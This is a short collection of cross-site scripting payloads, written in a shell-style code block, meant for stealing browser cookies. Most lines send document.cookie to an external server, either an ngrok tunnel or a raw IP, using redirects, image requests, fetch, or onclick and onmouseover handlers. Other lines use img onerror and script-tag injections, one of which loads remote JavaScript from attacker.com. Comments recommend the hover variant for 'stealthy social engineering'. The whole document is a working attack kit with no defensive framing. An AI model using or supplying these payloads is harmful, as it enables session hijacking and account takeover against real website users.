```bash
document.location = 'http://4.tcp.ngrok.io:10402/steal?cookie=' + encodeURIComponent(document.cookie);

new Image().src = 'http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie);

fetch('http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie));

<a href="#" onclick="new Image().src='http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie)">Click me</a>
#When the user clicks the link, it silently sends the cookie to your server using an 
#image request.

<a href="#" onmouseover="new Image().src='http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie)">Hover here</a>
#Sends the cookie just by hovering — useful for stealthy social engineering.

<img src=0 onerror="alert('XSS')">

<img src=1 onerror=fetch('http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie));

<img src=1 onerror="import('//attacker.com/x.js')"> # Loads javascript from a remote server

"/><script>import('//localserver/xss.js')</script>

